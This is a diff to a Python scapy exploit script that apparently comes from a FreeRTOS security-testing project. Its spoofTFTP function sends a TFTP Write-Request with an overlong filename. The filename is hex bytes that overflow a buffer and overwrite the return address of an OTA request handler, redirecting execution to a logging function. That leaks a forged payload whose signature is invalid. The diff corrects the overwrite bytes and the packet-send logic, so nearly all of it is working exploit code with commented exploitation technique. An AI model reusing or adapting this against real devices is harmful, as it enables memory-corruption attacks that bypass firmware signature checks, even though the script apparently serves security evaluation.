@@ -9,37 +9,25 @@ def spoofTFTP(hostIP, targetIP, TFTPPort):
     # attackString is a malicious "filename" for a TFTP Write-Request packet.
     # The filename herein is too long, so it will overflow the receiver's buffer.
     # The opening character looks like a valid filename "lmcodemo.htm.sig" following
-    # by many padding characters.  The final four bytes are chosen so as to
+    # by many non-zero padding characters.  The final five bytes are chosen so as to
     # overwrite the return address of the "Receive_And_Process_One_OTA_Request()"
     # function (see fett/apps/freertos/ota.c) and force the return from that
-    # function to actually call Write_Payload_To_Log()
-    #
-    # The final four bytes match the address of Write_Payload_To_Log() BUT
-    # in LITTLE-ENDIAN format, so least-significant byte first.
+    # function to actually call Write_Payload_To_Log(), followed by a single
+    # zero byte to terminate the filename as required by the TFTP WRQ packet format.
+    # Note that addresses are LITTLE-ENDIAN, so least-significant byte first
     #
     # TODO - extract the address of Write_Payload_To_Log() using
     #  "nm WorkDir/osImages/FreeRTOS.elf | grep Write_Payload_To_Log"
     # or similar trickery
     #
-    #
     # If this attack is successful, then the content of demo_data (below) will
     # be leaked to the Log, even though the signature is invalid
-    #
-    # NB
-    # 1. The 'latin_1' encoding is used so that bytes between 0x80 and 0xff can be used.
-    # 2. A final 0x00 byte (so it forms a valid C string) will be automatically
-    #    added by scapy's TFTP_RRQ() contructor, so is not needed here.
-    attackString = bytearray.fromhex("6c 6d 63 6f 64 65 6d 6f 2e 68 74 6d 2e 73 69 67 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c  6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c e0 6d 1b c0 d0 c8 01 c0")
-
-
-#.decode('cp437')
+    attackString = bytearray.fromhex("6c 6d 63 6f 64 65 6d 6f 2e 68 74 6d 2e 73 69 67 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 20 6e 1b c0 d0 c8 01 c0 00")
 
     # demo_data is a forged OTA payload, consisting of 85 bytes:
     #   64 bytes of (incorrect) Ed25519 signature
     #   21 character ASCII String "This should not work\n"
     demo_data = bytearray.fromhex("93 cd 69 8a 13 bd e1 dc 4b 38 0e ad 2c 05 f2 15 7b 50 95 b8 b3 f7 1b 65 ed 60 05 ef 97 f1 de 0d b1 70 d7 55 f5 56 c7 41 5d 73 9d 78 4e d6 af 84 b6 ff 20 00 ff 73 33 ab 7d 5e c1 5f e9 e3 48 0b 54 68 69 73 20 73 68 6f 75 6c 64 20 6e 6f 74 20 77 6f 72 6b 0a")
-
-#.decode('cp437')
 
     sport = 49152 # arbitrary, but avoid use of scapy.RandShort()
 
@@ -48,24 +36,16 @@ def spoofTFTP(hostIP, targetIP, TFTPPort):
     basic_udp = basic_ip/scapy.UDP(sport=sport,dport=TFTPPort)
     WRQ = basic_udp/scapy.TFTP(op=2)/scapy.TFTP_RRQ(filename=attackString,mode="octet")
 
-    print ("sudScapy: spoofTFTP 1")
-
     print ("WRQ Packet is")
     WRQ.show()
 
-    print ("sudScapy: spoofTFTP 2")
-
-    print ("Sending...")
+    print ("Sending WRQ...")
     try:
-        r = None
-        while not r or scapy.UDP not in r:
-            r = scapy.sr1(WRQ, timeout=3, verbose=True)
+        r = scapy.sr1(WRQ, timeout=3, verbose=True)
     except Exception as exc:
         print (f"Failed to send WRQ with exception {exc}")
 
-    print ("sudScapy: spoofTFTP 3")
-
-    print ("Response is")
+    print ("WRQ Response is")
     r.show()
 
     # Pick up the server's chosen port number as our destination port
@@ -79,19 +59,14 @@ def spoofTFTP(hostIP, targetIP, TFTPPort):
     print ("DATA packet is")
     DATA.show()
 
-    print ("sudScapy: spoofTFTP 4")
-
-    r2 = None
+    print ("Sending DATA...")
     try:
-        while not r2 or scapy.UDP not in r2:
-            r2 = scapy.sr1(DATA, timeout=3, verbose=True)
+        r2 = scapy.sr1(DATA, timeout=3, verbose=True)
     except Exception as exc:
         print (f"Failed to send DATA with exception {exc}")
 
-    print ("Response2 is")
+    print ("DATA Response is")
     r2.show()
-
-    print ("sudScapy: spoofTFTP 5")
 
     return
 
